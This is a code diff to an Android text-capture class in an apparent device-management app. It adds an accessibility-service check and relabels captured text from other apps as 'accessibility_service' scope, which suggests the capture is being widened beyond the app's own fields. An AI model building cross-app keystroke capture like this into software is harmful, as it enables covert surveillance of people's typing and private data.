@@ -1,8 +1,11 @@
 package com.company.devicemgr.utils;
 
+import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.provider.Settings;
 import android.text.Editable;
+import android.text.TextUtils;
 import android.text.TextWatcher;
 import android.util.Log;
 import android.widget.EditText;
@@ -49,6 +52,30 @@ public final class InAppTextCaptureManager {
 
     public static String consentVersion() {
         return CONSENT_VERSION;
+    }
+
+    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> serviceClass) {
+        try {
+            String enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (TextUtils.isEmpty(enabledServices)) return false;
+            String expected = context.getPackageName() + "/" + serviceClass.getName();
+            android.text.TextUtils.SimpleStringSplitter splitter = new android.text.TextUtils.SimpleStringSplitter(':');
+            splitter.setString(enabledServices);
+            while (splitter.hasNext()) {
+                String component = splitter.next();
+                if (expected.equalsIgnoreCase(component)) {
+                    return true;
+                }
+            }
+        } catch (Exception ignored) {
+        }
+        return false;
+    }
+
+    public static String buildAccessibilityStatus(Context context, Class<? extends AccessibilityService> serviceClass) {
+        return isAccessibilityServiceEnabled(context, serviceClass)
+                ? "Serviço de acessibilidade do teclado ativo."
+                : "Serviço de acessibilidade do teclado pendente. Abra as definições do Android e ative o serviço desta app.";
     }
 
     public static void setConsent(Context context, boolean granted) {
@@ -150,7 +177,7 @@ public final class InAppTextCaptureManager {
             entry.put("capturedAtMs", now);
             entry.put("capturedAt", new java.util.Date(now).toString());
             entry.put("syncKey", sha1(screenName + "|" + fieldName + "|" + normalizedValue + "|" + now));
-            entry.put("captureScope", "own_app_only");
+            entry.put("captureScope", context.getPackageName().equals(screenName) ? "own_app_only" : "accessibility_service");
             entry.put("packageName", context.getPackageName());
         } catch (Exception e) {
             Log.e(TAG, "recordTextChange build err", e);
